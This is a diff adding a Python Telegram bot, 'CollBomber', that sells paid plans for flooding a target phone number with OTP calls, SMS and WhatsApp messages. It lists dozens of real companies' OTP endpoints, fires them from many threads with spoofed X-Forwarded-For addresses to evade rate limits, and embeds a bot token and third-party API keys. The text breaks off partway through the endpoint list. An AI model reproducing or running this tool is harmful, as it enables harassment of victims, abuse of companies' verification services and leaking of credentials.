@@ -1,0 +1,1383 @@
+#!/usr/bin/env python3
+"""
+🔥 CollBomber Telegram Bot — Ultra Fast Mode (Enhanced)
+Package: com.rolex.mybasic.collbomber
+180+ APIs | Call + SMS + WhatsApp + Mix | Multi-threaded
+"""
+
+import telebot
+from telebot import types
+import requests
+import threading
+import time
+import random
+import uuid
+import re
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from datetime import datetime, timedelta
+import json
+from collections import defaultdict
+import hashlib
+import os
+
+# ============================================================
+# CONFIG — Bot Token + Speed Settings
+# ============================================================
+API_TOKEN = os.environ.get("BOT_TOKEN", "8603475566:AAHctIN5YRDq5TMSnR9rnGeUPfylHUcgFJ0")
+
+if not API_TOKEN:
+    try:
+        from config_token import TOKEN as API_TOKEN
+    except ImportError:
+        API_TOKEN = "8603475566:AAHctIN5YRDq5TMSnR9rnGeUPfylHUcgFJ0"
+
+MAX_WORKERS = 30
+SMS_MAX_WORKERS = 50
+DELAY_BETWEEN_ROUNDS = 0.3
+SMS_DELAY_BETWEEN_ROUNDS = 0.1
+SMS_DOUBLE_FIRE = True
+SMS_AUTO_RETRY = True
+
+IMPORTANT_CALL_INTERVAL = 3
+IMPORTANT_5S_INTERVAL = 3
+
+# ============================================================
+# ADMIN CONFIG
+# ============================================================
+ADMIN_IDS = [8128821116]
+ADMIN_DB_PATH = "admin_db.json"
+
+# ============================================================
+# CHANNEL CONFIG
+# ============================================================
+REQUIRED_CHANNEL = "@rolexxbomber"
+CHANNEL_LINK = "https://t.me/rolexxbomber"
+WELCOME_IMAGE = "https://imgh.in/host/gdzq2c"
+
+bot = telebot.TeleBot(API_TOKEN)
+
+# ============================================================
+# ADMIN DATABASE
+# ============================================================
+class AdminDB:
+    def __init__(self, db_path=ADMIN_DB_PATH):
+        self.db_path = db_path
+        self.lock = threading.Lock()
+        self.data = self._load()
+
+    def _load(self):
+        try:
+            with open(self.db_path, 'r') as f:
+                return json.load(f)
+        except (FileNotFoundError, json.JSONDecodeError):
+            return {
+                "users": {},
+                "banned": [],
+                "admins": [],
+                "broadcasts": 0,
+                "total_bombs": 0,
+                "verified": [],
+                "keys": {},
+                "subscriptions": {},
+                "api_stats": {},
+                "premium_users": [],
+                "admin_contacts": [],
+                "contact_messages": {}
+            }
+
+    def _save(self):
+        with open(self.db_path, "w") as f:
+            json.dump(self.data, f, indent=2)
+
+    def track_user(self, user_id, username, phone, mode):
+        with self.lock:
+            uid = str(user_id)
+            if uid not in self.data["users"]:
+                self.data["users"][uid] = {
+                    "username": username or "Unknown",
+                    "first_seen": datetime.now().isoformat(),
+                    "phone": phone,
+                    "total_sessions": 0,
+                    "total_hits": 0,
+                    "total_ok": 0,
+                    "total_fail": 0,
+                    "total_rounds": 0,
+                    "modes_used": [],
+                    "last_active": datetime.now().isoformat(),
+                    "last_phone": phone,
+                    "last_mode": mode
+                }
+            u = self.data["users"][uid]
+            u["last_active"] = datetime.now().isoformat()
+            u["last_phone"] = phone
+            u["last_mode"] = mode
+            u["total_sessions"] += 1
+            if mode not in u["modes_used"]:
+                u["modes_used"].append(mode)
+            u["username"] = username or u["username"]
+            self._save()
+
+    def update_stats(self, user_id, ok, fail, rounds, total):
+        with self.lock:
+            uid = str(user_id)
+            if uid in self.data["users"]:
+                u = self.data["users"][uid]
+                u["total_hits"] += total
+                u["total_ok"] += ok
+                u["total_fail"] += fail
+                u["total_rounds"] += rounds
+                u["last_active"] = datetime.now().isoformat()
+                self.data["total_bombs"] += total
+                self._save()
+
+    def is_banned(self, user_id):
+        with self.lock:
+            return str(user_id) in self.data.get("banned", [])
+
+    def is_admin(self, user_id):
+        with self.lock:
+            return str(user_id) in self.data.get("admins", []) or user_id in ADMIN_IDS
+
+    def ban_user(self, user_id, admin_id):
+        with self.lock:
+            uid = str(user_id)
+            if uid not in self.data["banned"]:
+                self.data["banned"].append(uid)
+                self.data.setdefault("ban_log", []).append({
+                    "user_id": uid,
+                    "admin_id": admin_id,
+                    "action": "ban",
+                    "time": datetime.now().isoformat()
+                })
+                self._save()
+                return True
+            return False
+
+    def unban_user(self, user_id, admin_id):
+        with self.lock:
+            uid = str(user_id)
+            if uid in self.data["banned"]:
+                self.data["banned"].remove(uid)
+                self.data.setdefault("ban_log", []).append({
+                    "user_id": uid,
+                    "admin_id": admin_id,
+                    "action": "unban",
+                    "time": datetime.now().isoformat()
+                })
+                self._save()
+                return True
+            return False
+
+    def add_admin(self, user_id, added_by):
+        with self.lock:
+            uid = str(user_id)
+            if uid not in self.data["admins"]:
+                self.data["admins"].append(uid)
+                self._save()
+                return True
+            return False
+
+    def remove_admin(self, user_id):
+        with self.lock:
+            uid = str(user_id)
+            if uid in self.data["admins"]:
+                self.data["admins"].remove(uid)
+                self._save()
+                return True
+            return False
+
+    def get_all_users(self):
+        with self.lock:
+            return dict(self.data["users"])
+
+    def get_user_count(self):
+        with self.lock:
+            return len(self.data["users"])
+
+    def get_banned_count(self):
+        with self.lock:
+            return len(self.data.get("banned", []))
+
+    def get_total_bombs(self):
+        with self.lock:
+            return self.data.get("total_bombs", 0)
+
+    def verify_user(self, user_id):
+        with self.lock:
+            uid = str(user_id)
+            if uid not in self.data.get("verified", []):
+                self.data.setdefault("verified", []).append(uid)
+                self._save()
+                return True
+            return False
+
+    def is_verified(self, user_id):
+        with self.lock:
+            return str(user_id) in self.data.get("verified", [])
+
+    def generate_key(self, plan, created_by, custom_days=None):
+        with self.lock:
+            self.data.setdefault("keys", {})
+            self.data.setdefault("subscriptions", {})
+
+            raw = f"{plan}_{uuid.uuid4().hex}_{time.time()}_{random.randint(1000,9999)}"
+            key = hashlib.md5(raw.encode()).hexdigest()[:16].upper()
+            key = "-".join([key[i:i+4] for i in range(0, 16, 4)])
+
+            plan_config = {
+                "daily": {"days": 1, "concurrent": 2, "hours": 2, "price": 40},
+                "monthly": {"days": 30, "concurrent": 2, "hours": 8, "price": 199},
+                "3month": {"days": 90, "concurrent": 3, "hours": 24, "price": 499},
+                "custom": {"days": custom_days or 30, "concurrent": 5, "hours": 24, "price": 0},
+            }
+
+            if custom_days and plan == "custom":
+                cfg = plan_config["custom"]
+                cfg["days"] = custom_days
+            else:
+                cfg = plan_config.get(plan, plan_config["monthly"])
+
+            self.data["keys"][key] = {
+                "plan": plan,
+                "days": cfg["days"],
+                "concurrent": cfg["concurrent"],
+                "max_hours": cfg["hours"],
+                "price": cfg["price"],
+                "created_by": created_by,
+                "created_at": datetime.now().isoformat(),
+                "used": False,
+                "used_by": None,
+                "used_at": None,
+                "expires_at": None
+            }
+            self._save()
+            return key
+
+    def redeem_key(self, key, user_id):
+        with self.lock:
+            self.data.setdefault("keys", {})
+            self.data.setdefault("subscriptions", {})
+            uid = str(user_id)
+
+            if key not in self.data["keys"]:
+                return False, "❌ Invalid key! Yeh key exist nahi karti."
+
+            k = self.data["keys"][key]
+            if k["used"]:
+                return False, "❌ Yeh key already used ho chuki hai!"
+
+            now = datetime.now()
+            if k["days"] >= 99999:
+                expires = (now.replace(year=now.year + 50)).isoformat()
+            else:
+                expires = (now + timedelta(days=k["days"])).isoformat()
+
+            self.data["subscriptions"][uid] = {
+                "plan": k["plan"],
+                "started_at": now.isoformat(),
+                "expires_at": expires,
+                "max_concurrent": k["concurrent"],
+                "max_hours": k["max_hours"],
+                "price": k["price"],
+                "active": True
+            }
+
+            if uid not in self.data.get("premium_users", []):
+                self.data.setdefault("premium_users", []).append(uid)
+
+            k["used"] = True
+            k["used_by"] = uid
+            k["used_at"] = now.isoformat()
+            self._save()
+            return True, (f"✅ *Plan Activated!*\n\n"
+                          f"🎯 Plan: {k['plan'].upper()}\n"
+                          f"⏱ Duration: {k['days']} days\n"
+                          f"⚡ Concurrent: {k['concurrent']}\n"
+                          f"⏰ Max Hours: {k['max_hours']}h")
+
+    def get_subscription(self, user_id):
+        with self.lock:
+            uid = str(user_id)
+            sub = self.data.get("subscriptions", {}).get(uid)
+            if not sub:
+                return None
+            if sub.get("expires_at"):
+                expires = datetime.fromisoformat(sub["expires_at"])
+                if datetime.now() > expires:
+                    sub["active"] = False
+                    self._save()
+                    return None
+            return sub
+
+    def get_all_keys(self):
+        with self.lock:
+            return dict(self.data.get("keys", {}))
+
+    def get_premium_users(self):
+        with self.lock:
+            return self.data.get("premium_users", [])
+
+    def reset_premium(self, user_id):
+        with self.lock:
+            uid = str(user_id)
+            if uid in self.data.get("premium_users", []):
+                self.data["premium_users"].remove(uid)
+            if uid in self.data.get("subscriptions", {}):
+                del self.data["subscriptions"][uid]
+            self._save()
+            return True
+
+    def update_api_stats(self, api_name, success):
+        with self.lock:
+            stats = self.data.setdefault("api_stats", {})
+            if api_name not in stats:
+                stats[api_name] = {"success": 0, "fail": 0}
+            if success:
+                stats[api_name]["success"] += 1
+            else:
+                stats[api_name]["fail"] += 1
+            self._save()
+
+    def get_api_stats(self):
+        with self.lock:
+            return self.data.get("api_stats", {})
+
+    def add_admin_contact(self, admin_id):
+        with self.lock:
+            uid = str(admin_id)
+            if uid not in self.data.get("admin_contacts", []):
+                self.data.setdefault("admin_contacts", []).append(uid)
+                self._save()
+                return True
+            return False
+
+    def remove_admin_contact(self, admin_id):
+        with self.lock:
+            uid = str(admin_id)
+            if uid in self.data.get("admin_contacts", []):
+                self.data["admin_contacts"].remove(uid)
+                self._save()
+                return True
+            return False
+
+    def get_admin_contacts(self):
+        with self.lock:
+            return self.data.get("admin_contacts", [])
+
+    def save_contact_message(self, msg_id, user_id, admin_id, message):
+        with self.lock:
+            self.data.setdefault("contact_messages", {})
+            self.data["contact_messages"][str(msg_id)] = {
+                "user_id": str(user_id),
+                "admin_id": str(admin_id),
+                "message": message,
+                "timestamp": datetime.now().isoformat(),
+                "replied": False
+            }
+            self._save()
+
+    def mark_message_replied(self, msg_id):
+        with self.lock:
+            if str(msg_id) in self.data.get("contact_messages", {}):
+                self.data["contact_messages"][str(msg_id)]["replied"] = True
+                self._save()
+                return True
+            return False
+
+admin_db = AdminDB()
+
+# ============================================================
+# API CONFIG
+# ============================================================
+class ApiConfig:
+    def __init__(self, name, url, method="GET", headers=None, body=None, category="sms", delay_ms=0):
+        self.name = name
+        self.url = url
+        self.method = method
+        self.headers = headers or {"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"}
+        self.body = body
+        self.category = category
+        self.delay_ms = delay_ms
+
+    def build_request(self, phone, duration=3):
+        ts = str(int(time.time() * 1000))
+        rand_id = uuid.uuid4().hex[:8]
+        uid = uuid.uuid4().hex
+        md5 = uid.replace("-", "")[:32]
+        random_pan = random.choice(["ABCDE1234F", "GDODJ5434B", "GSISB5468H", "HSOSN5464B",
+                                     "FUOUR2389B", "VUJVU5675H", "TSISV5434B"])
+
+        final_url = self.url
+        for key, val in [("{phone}", phone), ("{number}", phone), ("{duration}", str(duration)),
+                         ("{timestamp}", ts), ("{random_md5}", md5), ("{uuid}", uid),
+                         ("{random_id}", rand_id), ("{random_pan}", random_pan)]:
+            final_url = final_url.replace(key, val)
+
+        headers = dict(self.headers)
+        if "X-Forwarded-For" not in headers and "Client-IP" not in headers:
+            spoof = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+            headers["X-Forwarded-For"] = spoof
+            headers["Client-IP"] = spoof
+
+        body = self.body
+        if body:
+            for key, val in [("{phone}", phone), ("{number}", phone), ("{duration}", str(duration)),
+                             ("{timestamp}", ts), ("{random_md5}", md5), ("{uuid}", uid),
+                             ("{random_id}", rand_id), ("{random_pan}", random_pan)]:
+                body = body.replace(key, val)
+
+        return final_url, headers, body
+
+# ============================================================
+# ALL APIS - COMPLETE 180+ APIS
+# ============================================================
+def get_all_apis():
+    apis = []
+
+    # ====== CALL APIs ======
+    call_apis = [
+        ApiConfig("TataCapital_Call", "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}', "call"),
+        ApiConfig("1MG_Call", "https://www.1mg.com/auth_api/v6/create_token", "POST",
+                  {"Content-Type": "application/json"}, '{"number":"{phone}","otp_on_call":true}', "call"),
+        ApiConfig("Swiggy_Call", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
+        ApiConfig("Swiggy_Call_Verification", "https://profile.swiggy.com/api/v3/app/request_call_verification", "POST",
+                  {"Content-Type": "application/json; charset=utf-8"}, '{"mobile":"{phone}"}', "call"),
+        ApiConfig("Myntra_Call", "https://www.myntra.com/gw/mobile-auth/otp/generate", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
+        ApiConfig("Flipkart_Call", "https://2.rome.api.flipkart.com/api/4/user/otp/generate", "POST",
+                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}"}', "call"),
+        ApiConfig("Paytm_Call", "https://accounts.paytm.com/signin/otp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","loginData":"LOGIN_USING_PHONE"}', "call"),
+        ApiConfig("Zomato_Call", "https://www.zomato.com/php/asyncLogin.php", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}", "call"),
+        ApiConfig("MakeMyTrip_Call", "https://www.makemytrip.com/api/umbrella/otp", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
+        ApiConfig("Uber_Call", "https://auth.uber.com/v2/otp", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
+        ApiConfig("BigBasket_Call", "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile_number":"{phone}"}', "call"),
+        ApiConfig("PhonePe_Call", "https://www.phonepe.com/api/v2/otp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
+        ApiConfig("OYO_Call", "https://api.oyoroomscrm.com/api/v2/user/send_otp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
+        ApiConfig("Rapido_Call", "https://rapido.bike/api/v2/otp/generate", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
+        ApiConfig("BookMyShow_Call", "https://in.bmscdn.com/mjson/User/SendOTP", "POST",
+                  {"Content-Type": "application/json"}, '{"mobileNo":"{phone}"}', "call"),
+        ApiConfig("Meesho_Call", "https://api.meesho.com/v2/auth/send_otp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
+        ApiConfig("Snapdeal_Call", "https://www.snapdeal.com/authenticate", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "call"),
+        ApiConfig("Croma_Call", "https://api.croma.com/otp/generate", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}', "call"),
+        ApiConfig("Call_Bomber", "https://call-bomber-50k3t8a6r.vercel.app/bomb?number={phone}", "GET",
+                  {}, None, "call"),
+        ApiConfig("Jio_Call", "https://www.jio.com/api/jio-login-service/login/sendOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","loginFlowType":"MOBILE","alternateNumber":""}', "call"),
+        ApiConfig("MagicPin_Call", "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/", "POST",
+                  {"Content-Type": "application/json", "auth-secret-key": "kQLMCQBrfevxhzuPpFWT",
+                   "origin": "https://magicpin.in", "x-requested-with": "mark.via.gp",
+                   "referer": "https://magicpin.in/"}, 
+                  '{"phoneNumber":"91{phone}","authMethod":"call","token":""}', "call"),
+        ApiConfig("Astroyogi_Call", "https://comm.astroyogi.com/api/OtpComm/SendOtp", "POST",
+                  {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg4NDU0MTc4LCJleHAiOjE3OTYyMzAxNzh9."},
+                  '{"phoneCode":"91","countryCode":"IN","mobileNumber":"{phone}","platform":"Web","IpAddress":"117.225.1.174","requestType":"call","countryCodeByHeader":"IN"}', "call"),
+        ApiConfig("Refyne_Call", "https://prod-api.refyne.co.in/auth/v3/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"channel":"IVR","recipient":"{phone}"}', "call"),
+        ApiConfig("SonyLiv_Call", "https://apiv2.sonyliv.com/AGL/2.8/A/ENG/MWEB/IN/UP/CREATEOTP-V2", "POST",
+                  {"Content-Type": "application/json", "app_version": "3.8.3"},
+                  '{"mobileNumber":"{phone}","smsType":"Voice","channelPartnerID":"MSMIND","country":"IN","timestamp":"{timestamp}","otpSize":4,"isMobileMandatory":true,"loginType":"REGISTERORSIGNIN"}', "call"),
+        ApiConfig("Snitch_Call", "https://www.snitch.com/api/auth/resend-otp?mode=voice", "POST",
+                  {"Content-Type": "application/json", "X-CAP-Token": "015a4adb4fcebceb:dcd8d06bbd9311f025af80eaeeb8e0"},
+                  '{"mobile_number":"+91{phone}"}', "call"),
+        ApiConfig("Ixigo_Call", "https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"},
+                  'token=0732ff21f3263cee48320831c049192e22ffa805b4ca14add9c963945e4de6dde05739779f718e1fe35faa7297ac035389752adfda0548baf249b0d9fdc6a05f&sixDigitOTP=true&prefix=%2B91&phone={phone}&resendOnCall=true', "call"),
+        ApiConfig("Hotstar_Call", "https://web.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=resendOtp", "POST",
+                  {"Content-Type": "application/json", "x-hs-platform": "mweb", "x-country-code": "in"},
+                  '{"body":{"@type":"type.googleapis.com/feature.login.InitiatePhoneLoginRequest","phone_number":"{phone}","initiate_by":1,"recaptcha_token":"","source":0}}', "call"),
+        ApiConfig("Airtel_Call", "https://myairtelapp.bsbportal.com/app/guardian/api/bouncer/v1/sendOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"key":"data={phone}&timestamp={timestamp}"}', "call"),
+        ApiConfig("Jeevansathi_Call", "https://www.jeevansathi.com/app-gateway/auth/v1/phone/otp", "POST",
+                  {"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"}, '{"userId":"{phone}","isd":"91","otpType":"LOGIN_PROFILE"}', "call"),
+        ApiConfig("Mobikwik_Call", "https://webapi.mobikwik.com/p/otp/v1/generate", "POST",
+                  {"Content-Type": "application/json"}, '{"data":"{random_md5}"}', "call"),
+        ApiConfig("Quikr_Call", "https://www.quikr.com/core/sendOtp", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile={phone}", "call"),
+        ApiConfig("Practo_Call", "https://accounts.practo.com/send_voice_otp", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile=%2B91{phone}", "call"),
+        ApiConfig("SmartCoin_Call", "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request", "POST",
+                  {"Content-Type": "application/json", "user_platform": "WEBFLOW", "platform_code": "olyv"},
+                  '{"phone_number":"{phone}","app_version":"100101","channel":"IVR","request_type":"REGISTRATION","onboarding_consent":true}', "call"),
+        ApiConfig("OLX_Call", "https://www.olx.in/api/auth/authenticate", "POST",
+                  {"Content-Type": "application/json", "user-agent": "okhttp/3.9.1"},
+                  '{"method":"call","phone":"{phone}","language":"en-IN","grantType":"retry"}', "call"),
+        ApiConfig("Niloy_Call_API", "https://rk-niloy-call-api.vercel.app/api?phone={phone}", "GET", {}, None, "call"),
+        ApiConfig("NoBroker_Call", "https://www.nobroker.in/api/v3/account/otp/send", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}&countryCode=IN", "call"),
+        ApiConfig("RedBus_Call", "https://www.redbus.in/api/getOtpV2", "POST",
+                  {"Content-Type": "application/json"}, '{"phoneCode":"91","mobile":"{phone}","whatsappOption":false,"reCaptchaResponse":"{random_md5}"}', "call"),
+        ApiConfig("PharmEasy_Call", "https://pharmeasy.in/api/auth/requestOTP", "POST",
+                  {"Content-Type": "application/json"}, '{"contactNumber":"{phone}"}', "call"),
+        ApiConfig("Lenskart_Call", "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "POST",
+                  {"Content-Type": "application/json", "x-api-client": "mobilesite", "x-session-token": "{uuid}"},
+                  '{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}', "call"),
+        ApiConfig("GoKwik_Call", "https://gkx.gokwik.co/v4/auth/otp/login/trigger", "POST",
+                  {"Content-Type": "application/json", "authorization": "{uuid}"}, 
+                  '{"phone":"{phone}","country":"IN"}', "call"),
+        ApiConfig("Zepto_Call", "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/", "POST",
+                  {"Content-Type": "application/json", "session_id": "{uuid}", "device_id": "{uuid}"},
+                  '{"mobileNumber":"{phone}","countryCode":"+91"}', "call"),
+        ApiConfig("Agoda_Call", "https://www.agoda.com/ul/api/v1/auth", "POST",
+                  {"Content-Type": "application/json"}, '{"email":"","keepMeSignedIn":false,"whatsapp":""}', "call"),
+        ApiConfig("VRLBus_Call", "https://www.vrlbus.in/Web_Methods/OtherWebMethod.aspx/GenrateOTP", "POST",
+                  {"Content-Type": "application/json;charset=UTF-8"}, '{"PhoneNo":"{phone}","Captcha":"{random_id}"}', "call"),
+        ApiConfig("KreditBee_Call", "https://api.kreditbee.in/v1/me/otp", "PUT",
+                  {"Content-Type": "application/json", "authorization": "Bearer null"},
+                  '{"reason":"loginOrRegister","mobile":"{phone}","appsflyerId":"{uuid}","mediaSource":"","firebaseInstanceId":"","firebaseiosAppInstId":""}', "call"),
+        ApiConfig("Udaan_Call", "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "x-app-id": "udaan-auth"},
+                  "mobile={phone}", "call"),
+        ApiConfig("Call_API", "https://call-api-sable.vercel.app/bomb/{phone}", "GET", {}, None, "call"),
+        ApiConfig("Thakur_Call", "https://thakur-bombcyber.kundanjha7782.workers.dev/?mobile={phone}", "GET", {}, None, "call"),
+        ApiConfig("Eyecon_Call", "https://api.eyecon-app.com/app/cli_auth/gettransport", "GET",
+                  {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, None, "call"),
+    ]
+    apis.extend(call_apis)
+
+    # ====== WHATSAPP APIs ======
+    whatsapp_apis = [
+        ApiConfig("KPN_WhatsApp", "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB", "POST",
+                  {"Content-Type": "application/json"}, '{"phone_number":{"number":"{phone}","country_code":"+91"}}', "whatsapp"),
+        ApiConfig("EkaCare_WhatsApp", "https://auth.eka.care/auth/init", "POST",
+                  {"Content-Type": "application/json"}, '{"payload":{"allowWhatsapp":true,"mobile":"+91{phone}"},"type":"mobile"}', "whatsapp"),
+        ApiConfig("MamaEarth_WA", "https://auth.mamaearth.in/v1/auth/initiate-signup", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}', "whatsapp"),
+        ApiConfig("Havells_WA", "https://havells.com/otplogin/account/otploginpost/", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "form_key=GvFYqgGVWCkuLoNT&mobile_number={phone}&is_whatsapp_promo=on", "whatsapp"),
+        ApiConfig("HeroFinCorp_WA", "https://loans.apps.herofincorp.com/api/generateOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","terms":true,"whatsapp":true}', "whatsapp"),
+        ApiConfig("Astroyogi_WA", "https://comm.astroyogi.com/api/OtpComm/SendOtp", "POST",
+                  {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg4NDU0MTc4LCJleHAiOjE3OTYyMzAxNzh9."},
+                  '{"phoneCode":"91","countryCode":"IN","mobileNumber":"{phone}","platform":"Web","IpAddress":"117.225.1.174","requestType":"whatsapp","countryCodeByHeader":"IN"}', "whatsapp"),
+        ApiConfig("Refyne_WA", "https://prod-api.refyne.co.in/auth/v3/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"channel":"WHATSAPP","recipient":"{phone}"}', "whatsapp"),
+        ApiConfig("MakeMyTrip_WA", "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in&language=eng&currency=inr", "POST",
+                  {"Content-Type": "application/json", "vid": "{uuid}", "tid": "{uuid}", "deviceid": "{uuid}", "region": "in", "language": "eng", "currency": "inr"},
+                  '{"loginId":"{phone}","type":6,"isEncoded":false,"channel":["MOBILE","WHATSAPP"],"appHashKey":"@www.makemytrip.com #","countryCode":"91"}', "whatsapp"),
+        ApiConfig("Housing_WA", "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API", "POST",
+                  {"Content-Type": "application/json", "phoenix-api-name": "LOGIN_SEND_OTP_API", "app-name": "mobile_web_buyer"},
+                  '{"query":"mutation($email:String,$phone:String,$otpLength:Int,$userAgent:String,$method:String,$preference:String,$channel:String){sendOtp(phone:$phone,email:$email,otpLength:$otpLength,userAgent:$userAgent,method:$method,preference:$preference,channel:$channel){success message}}","variables":{"phone":"{phone}","userAgent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/150.0.0.0 Mobile Safari/537.36","otpLength":4,"preference":"whatsapp"}}', "whatsapp"),
+        ApiConfig("HERE_WA", "https://app-api.here.co.in/users/v1/customer-portal/send-otp-for-portal", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","countryCodeId":"b43569eb-6798-43fb-8d27-47d55d7c544b","source":"whatsapp"}', "whatsapp"),
+        ApiConfig("VisitApp_WA", "https://api.getvisitapp.com/v3/new-auth/login-phone", "POST",
+                  {"Content-Type": "application/json"}, '{"channel":"whatsapp","resend":true,"countryCode":91,"phone":"{phone}","platform":"WEB"}', "whatsapp"),
+        ApiConfig("RegistaniaChar_WA", "https://admin.registaniachar.com/api/whatsapp/send-otp", "POST",
+                  {"Content-Type": "application/json", "X-Signature": "6d31a2232ee5ec6e868d2eade30e657ddce8f6ff4b417818313feef6a220a553"},
+                  '{"phone":"{phone}"}', "whatsapp"),
+        ApiConfig("MuscleBlaze_WA", "https://www.muscleblaze.com/veronica/user/validate/whatsapp/9/{phone}/signup?plt=2&st=9", "GET",
+                  {"HKAUTH": "396144437|9l7fQT5m5HJtTrXqRZiWdQ==", "pageuri": "/", "st": "9", "plt": "2"}, None, "whatsapp"),
+        ApiConfig("RedBus_WA", "https://www.redbus.in/hotels/api/sendOtpV2", "POST",
+                  {"Content-Type": "application/json"}, '{"phoneCode":"91","mobile":"{phone}","whatsappOptin":true,"reCaptchaResponse":"{random_md5}"}', "whatsapp"),
+        ApiConfig("Agoda_WA", "https://www.agoda.com/ul/api/v1/auth", "POST",
+                  {"Content-Type": "application/json"}, '{"email":"","keepMeSignedIn":false,"whatsapp":"+91{phone}"}', "whatsapp"),
+        ApiConfig("MagicPin_WA", "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/", "POST",
+                  {"Content-Type": "application/json", "auth-secret-key": "kQLMCQBrfevxhzuPpFWT", "origin": "https://magicpin.in", "x-requested-with": "mark.via.gp"},
+                  '{"phoneNumber":"91{phone}","authMethod":"whatsapp","token":"{random_md5}"}', "whatsapp"),
+    ]
+    apis.extend(whatsapp_apis)
+
+    # ====== SMS APIs ======
+    sms_apis = [
+        ApiConfig("Lenskart", "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"phoneCode":"+91","telephone":"{phone}"}'),
+        ApiConfig("NoBroker", "https://www.nobroker.in/api/v3/account/otp/send", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}&countryCode=IN"),
+        ApiConfig("PharmEasy", "https://pharmeasy.in/api/v2/auth/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
+        ApiConfig("Wakefit", "https://api.wakefit.co/api/consumer-sms-otp/", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
+        ApiConfig("Meru", "https://merucabapp.com/api/otp/generate", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile_number={phone}"),
+        ApiConfig("Doubtnut", "https://api.doubtnut.com/v4/student/login", "POST",
+                  {"Content-Type": "application/json"}, '{"phone_number":"{phone}","language":"en"}'),
+        ApiConfig("ShipRocket", "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "POST",
+                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}"}'),
+        ApiConfig("Servetel", "https://api.servetel.in/v1/auth/otp", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile_number={phone}"),
+        ApiConfig("Snitch", "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile_number":"+91{phone}"}'),
+        ApiConfig("Housing", "https://login.housing.com/api/v2/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","country_url_name":"in"}'),
+        ApiConfig("RentoMojo", "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "POST",
